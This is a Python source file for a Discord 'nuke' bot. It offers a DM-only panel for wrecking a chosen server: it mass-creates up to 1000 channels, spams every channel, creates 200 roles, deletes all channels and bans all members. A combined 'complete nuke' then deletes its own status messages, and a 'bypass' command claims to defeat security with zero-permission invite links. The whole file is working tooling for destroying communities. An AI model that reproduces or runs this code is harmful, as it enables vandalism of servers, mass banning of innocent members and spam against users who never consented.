import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import json
import os

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

user_sessions = {}

OWNER_ID = 1507880423563460699
AUTHORIZED_USERS_FILE = "authorized_users.json"
ADMIN_USERS_FILE = "admin_users.json"
TOKEN_FILE = "config.txt"

CHANNEL_CREATE_DELAY = 0.001
MESSAGE_SEND_DELAY = 0.0001
ROLE_CREATE_DELAY = 0.005
BAN_DELAY = 0.0001

def load_token():
    try:
        with open(TOKEN_FILE, "r") as f:
            for line in f:
                if line.startswith("TOKEN="):
                    return line.split("=", 1)[1].strip()
    except FileNotFoundError:
        print("ERROR: config.txt not found!")
        return None

def load_authorized_users():
    if os.path.exists(AUTHORIZED_USERS_FILE):
        try:
            with open(AUTHORIZED_USERS_FILE, "r") as f:
                return json.load(f)
        except:
            return []
    return []

def save_authorized_users(users):
    with open(AUTHORIZED_USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)

def add_authorized_user(user_id):
    users = load_authorized_users()
    if user_id not in users:
        users.append(user_id)
        save_authorized_users(users)
        print(f"SUCCESS: User {user_id} added")
        return True
    return False

def is_authorized(user_id):
    users = load_authorized_users()
    admin_users = load_admin_users()
    return user_id in users or user_id in admin_users or user_id == OWNER_ID

def remove_authorized_user(user_id):
    users = load_authorized_users()
    if user_id in users:
        users.remove(user_id)
        save_authorized_users(users)
        print(f"SUCCESS: User {user_id} removed")
        return True
    return False

def load_admin_users():
    if os.path.exists(ADMIN_USERS_FILE):
        try:
            with open(ADMIN_USERS_FILE, "r") as f:
                return json.load(f)
        except:
            return []
    return []

def save_admin_users(users):
    with open(ADMIN_USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)

def add_admin_user(user_id):
    users = load_admin_users()
    if user_id not in users:
        users.append(user_id)
        save_admin_users(users)
        print(f"SUCCESS: User {user_id} added as admin")
        return True
    return False

def is_admin(user_id):
    users = load_admin_users()
    return user_id in users or user_id == OWNER_ID

def remove_admin_user(user_id):
    users = load_admin_users()
    if user_id in users:
        users.remove(user_id)
        save_admin_users(users)
        print(f"SUCCESS: Admin {user_id} removed")
        return True
    return False

class BypassClientIDModal(discord.ui.Modal, title="BYPASS BOT"):
    client_id = discord.ui.TextInput(
        label="Target Bot Client ID",
        placeholder="e.g., 1234567890",
        required=True,
        min_length=1,
        max_length=20
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        if not is_authorized(interaction.user.id):
            embed = discord.Embed(
                title="ERROR - UNAUTHORIZED",
                description=f"You are not authorized!\nYour ID: {interaction.user.id}",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
            return

        try:
            bot_client_id = int(self.client_id.value.strip())
            bypass_invite_url = f"https://discord.com/oauth2/authorize?client_id={bot_client_id}&scope=bot&permissions=0"

            embed = discord.Embed(
                title="SUCCESS - BYPASS LINK GENERATED",
                description=f"Bot Client ID: {bot_client_id}",
                color=discord.Color.green()
            )
            embed.add_field(
                name="BYPASS LINK",
                value=f"[Click Here]({bypass_invite_url})",
                inline=False
            )
            embed.add_field(
                name="HOW IT WORKS",
                value="- Bot joins with ZERO PERMISSIONS\n- Security BYPASSED\n- Admin powers DISABLED",
                inline=False
            )

            await interaction.followup.send(embed=embed, ephemeral=True)

        except ValueError:
            embed = discord.Embed(
                title="ERROR",
                description="Invalid Bot Client ID!",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)

class BypassButtonView(discord.ui.View):
    def __init__(self, user_id):
        super().__init__()
        self.user_id = user_id

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("ERROR: Only you can use this", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="TARGET BOT CLIENT ID", style=discord.ButtonStyle.danger)
    async def bypass_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = BypassClientIDModal()
        await interaction.response.send_modal(modal)

class SelectGuildButton(discord.ui.View):
    def __init__(self, user_id):
        super().__init__()
        self.user_id = user_id

        invite_url = "https://discord.com/oauth2/authorize?client_id=1516407479356100668"
        self.add_item(discord.ui.Button(label="INVITE BOT", style=discord.ButtonStyle.link, url=invite_url))

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("ERROR: Only you can use this", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="SELECT TARGET SERVER", style=discord.ButtonStyle.primary)
    async def select_guild(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = GuildIDModal(self.user_id, bot)
        await interaction.response.send_modal(modal)

class GuildIDModal(discord.ui.Modal):
    def __init__(self, user_id, bot_instance):
        super().__init__(title="Select Server")
        self.user_id = user_id
        self.bot = bot_instance

        self.guild_id = discord.ui.TextInput(
            label="Guild ID",
            placeholder="Enter your server Guild ID",
            required=True,
            min_length=1,
            max_length=20
        )
        self.add_item(self.guild_id)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        try:
            guild_id = int(self.guild_id.value.strip())
            guild = self.bot.get_guild(guild_id)

            if not guild:
                embed = discord.Embed(
                    title="ERROR",
                    description="Guild Not Found!\nMake sure the bot is in this server",
                    color=discord.Color.red()
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
                return

            print(f"SUCCESS: Guild Detected: {guild.name} ({guild_id})")
            await interaction.followup.send("Detecting Server...", ephemeral=True)
            await asyncio.sleep(0.1)

            embed = discord.Embed(
                title=f"SUCCESS - {guild.name}",
                description=f"Members: {guild.member_count}\nID: {guild.id}\nChannels: {len(guild.channels)}\nRoles: {len(guild.roles)}",
                color=discord.Color.red()
            )
            embed.set_thumbnail(url=guild.icon.url if guild.icon else "")

            view = NukeOptionsView(self.user_id, guild_id, self.bot)
            user = await self.bot.fetch_user(self.user_id)
            await user.send(embed=embed, view=view)

        except ValueError:
            embed = discord.Embed(
                title="ERROR",
                description="Invalid Guild ID!",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)

class ChannelNameModal(discord.ui.Modal):
    def __init__(self, guild_id, user_id, bot_instance):
        super().__init__(title="CREATE CHANNELS")
        self.guild_id = guild_id
        self.user_id = user_id
        self.bot = bot_instance

        self.channel_count = discord.ui.TextInput(
            label="Channel Count",
            placeholder="Max 1000 channels",
            required=True,
            min_length=1,
            max_length=4
        )
        self.add_item(self.channel_count)

        self.channel_name = discord.ui.TextInput(
            label="Channel Name",
            placeholder="Enter channel name",
            required=True,
            min_length=1,
            max_length=80
        )
        self.add_item(self.channel_name)

        self.channel_type = discord.ui.TextInput(
            label="Channel Type (T=Text, V=Voice)",
            placeholder="T or V",
            required=True,
            min_length=1,
            max_length=1
        )
        self.add_item(self.channel_type)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        try:
            channel_count = int(self.channel_count.value.strip())
            channel_name = self.channel_name.value.strip()
            channel_type = self.channel_type.value.strip().upper()

            if channel_type not in ["T", "V"]:
                embed = discord.Embed(
                    title="ERROR",
                    description="Type must be T or V",
                    color=discord.Color.red()
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
                return

            if channel_count <= 0 or channel_count > 1000:
                embed = discord.Embed(
                    title="ERROR",
                    description="Count must be 1-1000",
                    color=discord.Color.red()
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
                return

            guild = self.bot.get_guild(self.guild_id)

            if guild:
                await interaction.followup.send("Processing...", ephemeral=True)
                await create_channels_custom(guild, channel_name, channel_type, channel_count, self.user_id)
            else:
                embed = discord.Embed(
                    title="ERROR",
                    description="Server not found!",
                    color=discord.Color.red()
                )
                await interaction.followup.send(embed=embed, ephemeral=True)

        except ValueError:
            embed = discord.Embed(
                title="ERROR",
                description="Invalid input!",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)

class SpamMessageModal(discord.ui.Modal):
    def __init__(self, guild_id, user_id, bot_instance):
        super().__init__(title="SPAM MESSAGES")
        self.guild_id = guild_id
        self.user_id = user_id
        self.bot = bot_instance

        self.spam_text = discord.ui.TextInput(
            label="Message to Spam",
            placeholder="Enter message",
            required=True,
            min_length=1,
            max_length=2000
        )
        self.add_item(self.spam_text)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        spam_text = self.spam_text.value
        guild = self.bot.get_guild(self.guild_id)

        if guild:
            await interaction.followup.send("Processing...", ephemeral=True)
            await spam_all_channels(guild, spam_text, self.user_id)
        else:
            embed = discord.Embed(
                title="ERROR",
                description="Server not found!",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)

class RoleNameModal(discord.ui.Modal):
    def __init__(self, guild_id, user_id, bot_instance):
        super().__init__(title="CREATE ROLES")
        self.guild_id = guild_id
        self.user_id = user_id
        self.bot = bot_instance

        self.role_name = discord.ui.TextInput(
            label="Role Name",
            placeholder="200 roles will be created",
            required=True,
            min_length=1,
            max_length=100
        )
        self.add_item(self.role_name)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        role_name = self.role_name.value
        guild = self.bot.get_guild(self.guild_id)

        if guild:
            await interaction.followup.send("Processing...", ephemeral=True)
            await create_200_roles(guild, role_name, self.user_id)
        else:
            embed = discord.Embed(
                title="ERROR",
                description="Server not found!",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)

class CompleteNukeModal(discord.ui.Modal):
    def __init__(self, guild_id, user_id, bot_instance):
        super().__init__(title="COMPLETE NUKE")
        self.guild_id = guild_id
        self.user_id = user_id
        self.bot = bot_instance

        self.channel_count = discord.ui.TextInput(
            label="Channel Count",
            placeholder="Max 1000",
            required=True,
            min_length=1,
            max_length=4
        )
        self.add_item(self.channel_count)

        self.channel_name = discord.ui.TextInput(
            label="Channel Name",
            placeholder="Name prefix",
            required=True,
            min_length=1,
            max_length=80
        )
        self.add_item(self.channel_name)

        self.spam_content = discord.ui.TextInput(
            label="Spam Content",
            placeholder="Message to spam",
            required=True,
            min_length=1,
            max_length=2000
        )
        self.add_item(self.spam_content)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        try:
            channel_count = int(self.channel_count.value.strip())
            channel_name = self.channel_name.value.strip()
            spam_content = self.spam_content.value.strip()

            if channel_count <= 0 or channel_count > 1000:
                embed = discord.Embed(
                    title="ERROR",
                    description="Count must be 1-999",
                    color=discord.Color.red()
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
                return

            guild = self.bot.get_guild(self.guild_id)

            if guild:
                await interaction.followup.send("Starting NUKE...", ephemeral=True)
                await create_and_spam_channels_nuke(guild, channel_name, spam_content, channel_count, self.user_id)
                await ban_all_members_auto(guild, self.user_id)
                await asyncio.sleep(0.1)
                await delete_nuke_messages(self.user_id)
            else:
                embed = discord.Embed(
                    title="ERROR",
                    description="Server not found!",
                    color=discord.Color.red()
                )
                await interaction.followup.send(embed=embed, ephemeral=True)

        except ValueError:
            embed = discord.Embed(
                title="ERROR",
                description="Invalid input!",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)

class NukeOptionsView(discord.ui.View):
    def __init__(self, user_id, guild_id, bot_instance):
        super().__init__()
        self.user_id = user_id
        self.guild_id = guild_id
        self.bot = bot_instance

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("ERROR: Only you can use this", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="CREATE CHANNELS", style=discord.ButtonStyle.success)
    async def create_channels(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = ChannelNameModal(self.guild_id, self.user_id, self.bot)
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="SPAM MESSAGES", style=discord.ButtonStyle.primary)
    async def spam_messages(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = SpamMessageModal(self.guild_id, self.user_id, self.bot)
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="BAN ALL", style=discord.ButtonStyle.danger)
    async def ban_members(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        guild = self.bot.get_guild(self.guild_id)
        if guild:
            await ban_all_members(guild, interaction, self.user_id)
        else:
            embed = discord.Embed(
                title="ERROR",
                description="Guild Not Found!",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="CREATE ROLES", style=discord.ButtonStyle.secondary)
    async def create_roles(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = RoleNameModal(self.guild_id, self.user_id, self.bot)
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="DELETE CHANNELS", style=discord.ButtonStyle.red)
    async def delete_channels(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        guild = self.bot.get_guild(self.guild_id)
        if guild:
            await delete_all_channels(guild, interaction, self.user_id)
        else:
            embed = discord.Embed(
                title="ERROR",
                description="Guild Not Found!",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="COMPLETE NUKE", style=discord.ButtonStyle.danger, row=1)
    async def complete_nuke(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = CompleteNukeModal(self.guild_id, self.user_id, self.bot)
        await interaction.response.send_modal(modal)

async def create_channels_custom(guild, channel_name, channel_type, total_count, user_id):
    created = 0
    failed = 0

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="STARTING CHANNEL CREATION",
            description=f"Name: {channel_name}\nType: {'Text' if channel_type == 'T' else 'Voice'}\nTotal: {total_count}",
            color=discord.Color.blue()
        )
        nuke_message = await user.send(embed=embed)
        user_sessions[user_id] = {"nuke_messages": [nuke_message.id]}
    except:
        pass

    tasks = []
    for i in range(total_count):
        async def create_channel(index):
            nonlocal created, failed
            try:
                if channel_type == "T":
                    await guild.create_text_channel(f"{channel_name}-{index+1}")
                else:
                    await guild.create_voice_channel(f"{channel_name}-{index+1}")
                created += 1
            except Exception as e:
                failed += 1
            await asyncio.sleep(CHANNEL_CREATE_DELAY)

        tasks.append(create_channel(i))

    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="CHANNELS CREATED",
            description=f"Success: {created}\nFailed: {failed}\nTotal: {total_count}",
            color=discord.Color.blue()
        )
        msg = await user.send(embed=embed)
        if user_id in user_sessions:
            user_sessions[user_id]["nuke_messages"].append(msg.id)
    except:
        pass

async def create_and_spam_channels_nuke(guild, channel_name, spam_content, total_count, user_id):
    created = 0
    total_spam = 0
    failed = 0

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="STARTING CHANNEL CREATE & SPAM",
            description=f"Name: {channel_name}\nTotal: {total_count}\nStatus: RUNNING",
            color=discord.Color.blue()
        )
        nuke_message = await user.send(embed=embed)
        user_sessions[user_id] = {"nuke_messages": [nuke_message.id]}
    except:
        pass

    for i in range(total_count):
        try:
            channel = await guild.create_text_channel(f"{channel_name}-{i+1}")
            created += 1

            for msg_num in range(5):
                try:
                    await channel.send(spam_content)
                    total_spam += 1
                    await asyncio.sleep(MESSAGE_SEND_DELAY)
                except:
                    failed += 1

            await asyncio.sleep(CHANNEL_CREATE_DELAY)
        except Exception as e:
            failed += 1
            await asyncio.sleep(CHANNEL_CREATE_DELAY)

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="CHANNELS & SPAM COMPLETED",
            description=f"Channels: {created}\nMessages: {total_spam}\nFailed: {failed}",
            color=discord.Color.blue()
        )
        msg = await user.send(embed=embed)
        if user_id in user_sessions:
            user_sessions[user_id]["nuke_messages"].append(msg.id)
    except:
        pass

async def spam_all_channels(guild, message_text, user_id):
    total_sent = 0
    failed = 0
    channels = guild.text_channels

    if not channels:
        try:
            user = await bot.fetch_user(user_id)
            embed = discord.Embed(
                title="ERROR",
                description="No text channels found!",
                color=discord.Color.red()
            )
            await user.send(embed=embed, ephemeral=True)
        except:
            pass
        return

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="STARTING SPAM",
            description=f"Message: {message_text[:50]}\nChannels: {len(channels)}",
            color=discord.Color.red()
        )
        await user.send(embed=embed, ephemeral=True)
    except:
        pass

    async def spam_channel_concurrent(channel):
        nonlocal total_sent, failed
        try:
            for _ in range(10):
                try:
                    await channel.send(message_text)
                    total_sent += 1
                    await asyncio.sleep(MESSAGE_SEND_DELAY)
                except:
                    failed += 1
        except:
            pass

    tasks = [spam_channel_concurrent(channel) for channel in channels]
    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="SPAM COMPLETED",
            description=f"Sent: {total_sent}\nFailed: {failed}\nChannels: {len(channels)}",
            color=discord.Color.red()
        )
        await user.send(embed=embed, ephemeral=True)
    except:
        pass

async def ban_all_members(guild, interaction, user_id):
    banned = 0
    failed = 0

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="STARTING BAN",
            description="Banning all members...",
            color=discord.Color.red()
        )
        await user.send(embed=embed, ephemeral=True)
    except:
        pass

    members = list(guild.members)

    async def ban_member(member):
        nonlocal banned, failed
        if member.bot or member == guild.owner:
            return
        try:
            await member.ban(reason="Nuked by bot")
            banned += 1
            await asyncio.sleep(BAN_DELAY)
        except Exception as e:
            failed += 1

    tasks = [ban_member(m) for m in members]
    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="BAN COMPLETED",
            description=f"Banned: {banned}\nFailed: {failed}",
            color=discord.Color.red()
        )
        await user.send(embed=embed, ephemeral=True)
    except:
        pass

async def ban_all_members_auto(guild, user_id):
    banned = 0
    failed = 0

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="STARTING BAN",
            description="Banning all members...",
            color=discord.Color.red()
        )
        msg = await user.send(embed=embed)
        if user_id in user_sessions:
            user_sessions[user_id]["nuke_messages"].append(msg.id)
    except:
        pass

    members = list(guild.members)

    async def ban_member(member):
        nonlocal banned, failed
        if member.bot or member == guild.owner:
            return
        try:
            await member.ban(reason="Nuked by bot")
            banned += 1
            await asyncio.sleep(BAN_DELAY)
        except Exception as e:
            failed += 1

    tasks = [ban_member(m) for m in members]
    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="BAN COMPLETED",
            description=f"Banned: {banned}\nFailed: {failed}",
            color=discord.Color.red()
        )
        msg = await user.send(embed=embed)
        if user_id in user_sessions:
            user_sessions[user_id]["nuke_messages"].append(msg.id)
    except:
        pass

async def delete_all_channels(guild, interaction, user_id):
    deleted = 0
    failed = 0

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="STARTING DELETE",
            description="Deleting all channels...",
            color=discord.Color.red()
        )
        await user.send(embed=embed, ephemeral=True)
    except:
        pass

    channels = list(guild.channels)

    async def delete_channel(channel):
        nonlocal deleted, failed
        try:
            await channel.delete()
            deleted += 1
            await asyncio.sleep(CHANNEL_CREATE_DELAY)
        except Exception as e:
            failed += 1

    tasks = [delete_channel(c) for c in channels]
    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="CHANNELS DELETED",
            description=f"Deleted: {deleted}\nFailed: {failed}",
            color=discord.Color.red()
        )
        await user.send(embed=embed, ephemeral=True)
    except:
        pass

async def create_200_roles(guild, role_name, user_id):
    created = 0
    failed = 0

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="STARTING ROLE CREATION",
            description=f"Name: {role_name}\nTotal: 200",
            color=discord.Color.from_rgb(0, 0, 0)
        )
        await user.send(embed=embed, ephemeral=True)
    except:
        pass

    tasks = []
    for i in range(200):
        async def create_role(index):
            nonlocal created, failed
            try:
                await guild.create_role(name=f"{role_name}-{index+1}", color=discord.Color.random())
                created += 1
            except Exception as e:
                failed += 1
            await asyncio.sleep(ROLE_CREATE_DELAY)

        tasks.append(create_role(i))

    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        user = await bot.fetch_user(user_id)
        embed = discord.Embed(
            title="ROLES CREATED",
            description=f"Success: {created}\nFailed: {failed}",
            color=discord.Color.from_rgb(0, 0, 0)
        )
        await user.send(embed=embed, ephemeral=True)
    except:
        pass

async def delete_nuke_messages(user_id):
    try:
        if user_id in user_sessions and "nuke_messages" in user_sessions[user_id]:
            user = await bot.fetch_user(user_id)
            async for message in user.dm_channel.history(limit=200):
                if message.id in user_sessions[user_id]["nuke_messages"]:
                    await message.delete()
            user_sessions[user_id]["nuke_messages"] = []
    except Exception as e:
        print(f"ERROR: Failed to delete messages: {e}")

@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"SUCCESS: Synced {len(synced)} commands")
    except Exception as e:
        print(f"ERROR: {e}")
    print(f"SUCCESS: Bot logged in as: {bot.user}")

@bot.tree.command(name="addauth", description="Add user permission")
@app_commands.describe(user_id="User ID to authorize")
async def addauth_command(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(ephemeral=True)

    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="ERROR - OWNER ONLY",
            description=f"Only owner can use this!",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return

    try:
        uid = int(user_id.strip())

        if add_authorized_user(uid):
            embed = discord.Embed(
                title="SUCCESS",
                description=f"User {uid} authorized!\nCan use: /panel /bypass",
                color=discord.Color.green()
            )
        else:
            embed = discord.Embed(
                title="INFO",
                description=f"User {uid} already authorized!",
                color=discord.Color.blue()
            )

        await interaction.followup.send(embed=embed, ephemeral=True)

    except ValueError:
        embed = discord.Embed(
            title="ERROR",
            description="Invalid User ID!",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="removeauth", description="Remove user permission")
@app_commands.describe(user_id="User ID to remove")
async def removeauth_command(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(ephemeral=True)

    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="ERROR - Flag OWNER ONLY",
            description=f"Only owner can use this!",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return

    try:
        uid = int(user_id.strip())

        if remove_authorized_user(uid):
            embed = discord.Embed(
                title="SUCCESS",
                description=f"User {uid} removed!",
                color=discord.Color.green()
            )
        else:
            embed = discord.Embed(
                title="INFO",
                description=f"User {uid} not found!",
                color=discord.Color.blue()
            )

        await interaction.followup.send(embed=embed, ephemeral=True)

    except ValueError:
        embed = discord.Embed(
            title="ERROR",
            description="Invalid User ID!",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="admin", description="Make user admin")
@app_commands.describe(user_id="User ID to make admin")
async def admin_command(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(ephemeral=True)

    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="ERROR - OWNER ONLY",
            description=f"Only owner can use this!",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return

    try:
        uid = int(user_id.strip())

        if add_admin_user(uid):
            embed = discord.Embed(
                title="SUCCESS",
                description=f"User {uid} is now admin!\nCan use: /addauth /panel /bypass",
                color=discord.Color.green()
            )
        else:
            embed = discord.Embed(
                title="INFO",
                description=f"User {uid} already admin!",
                color=discord.Color.blue()
            )

        await interaction.followup.send(embed=embed, ephemeral=True)

    except ValueError:
        embed = discord.Embed(
            title="ERROR",
            description="Invalid User ID!",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="removeadmin", description="Remove admin")
@app_commands.describe(user_id="User ID to remove")
async def removeadmin_command(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(ephemeral=True)

    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="ERROR - OWNER ONLY",
            description=f"Only owner can use this!",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return

    try:
        uid = int(user_id.strip())

        if remove_admin_user(uid):
            embed = discord.Embed(
                title="SUCCESS",
                description=f"User {uid} removed from admin!",
                color=discord.Color.green()
            )
        else:
            embed = discord.Embed(
                title="INFO",
                description=f"User {uid} not admin!",
                color=discord.Color.blue()
            )

        await interaction.followup.send(embed=embed, ephemeral=True)

    except ValueError:
        embed = discord.Embed(
            title="ERROR",
            description="Invalid User ID!",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="bypass", description="Generate bypass link")
async def bypass_command(interaction: discord.Interaction):
    if not is_authorized(interaction.user.id):
        embed = discord.Embed(
            title="ERROR - UNAUTHORIZED",
            description=f"You are not authorized!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if not isinstance(interaction.channel, discord.DMChannel):
        await interaction.response.send_message("ERROR: This command only works in DM!", ephemeral=True)
        return

    user_id = interaction.user.id

    embed = discord.Embed(
        title="SECURITY BYPASS",
        description="Generate Bypass Link for any Bot\n\n- Bot joins with ZERO PERMISSIONS\n- Security BYPASSED\n- Admin powers DISABLED",
        color=discord.Color.orange()
    )
    embed.add_field(name="WARNING", value="Target bot will have NO ADMIN POWERS", inline=False)

    view = BypassButtonView(user_id)
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="panel", description="Open Nuke Panel")
async def panel_command(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

    if not is_authorized(interaction.user.id):
        embed = discord.Embed(
            title="ERROR - UNAUTHORIZED",
            description=f"You are not authorized!",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        print(f"ERROR: Unauthorized access by {interaction.user.id}")
        return

    if not isinstance(interaction.channel, discord.DMChannel):
        await interaction.followup.send("ERROR: DM only!", ephemeral=True)
        return

    user_id = interaction.user.id

    embed = discord.Embed(
        title="NUKE CONTROL PANEL",
        description="PREMIUM Flag OG ",
        color=discord.Color.from_rgb(255, 0, 0)
    )

    view = SelectGuildButton(user_id)
    await interaction.followup.send(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="myid", description="Get your user ID")
async def myid_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="YOUR USER ID",
        description=f"{interaction.user.id}",
        color=discord.Color.blue()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="checkowner", description="Check if you are owner")
async def checkowner_command(interaction: discord.Interaction):
    is_owner = interaction.user.id == OWNER_ID

    if is_owner:
        embed = discord.Embed(
            title="YOU ARE OWNER",
            description=f"Your ID: {interaction.user.id}",
            color=discord.Color.green()
        )
    else:
        embed = discord.Embed(
            title="NOT OWNER",
            description=f"Your ID: {interaction.user.id}",
            color=discord.Color.red()
        )

    await interaction.response.send_message(embed=embed, ephemeral=True)

if __name__ == "__main__":
    TOKEN = load_token()

    if TOKEN:
        try:
            bot.run(TOKEN)
        except discord.LoginFailure:
            print("ERROR: Invalid token!")
    else:
        print("ERROR: TOKEN not found!")
